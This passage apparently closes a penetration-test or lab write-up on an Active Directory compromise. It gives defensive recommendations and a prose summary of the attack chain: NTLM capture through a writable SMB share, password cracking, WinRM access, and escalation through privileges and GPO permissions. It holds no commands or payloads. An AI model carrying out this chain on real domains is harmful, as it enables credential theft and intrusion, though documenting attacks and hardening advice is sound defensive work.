- Remove unauthenticated write access from SMB shares.
- Avoid hosting writable shares on domain controllers.
- Disable NTLM where possible and enforce Kerberos authentication.
- Block automatic processing of coercion-related file types (`.library-ms`, `.lnk`, `.scf`).
- Enforce strong password policies to prevent offline hash cracking.
- Restrict high-risk privileges (`SeRestorePrivilege`, `SeBackupPrivilege`) to administrators.
- Remove non-administrative users from GPO edit permissions.
- Monitor SMB access, WinRM logins, and GPO modifications.

## Conclusion

Domain compromise was achieved by exploiting a writable SMB share to capture NTLM credentials, cracking weak passwords, and authenticating via WinRM. Privilege escalation was possible through misconfigured user privileges and insecure GPO permissions, resulting in full administrative access to the domain controller.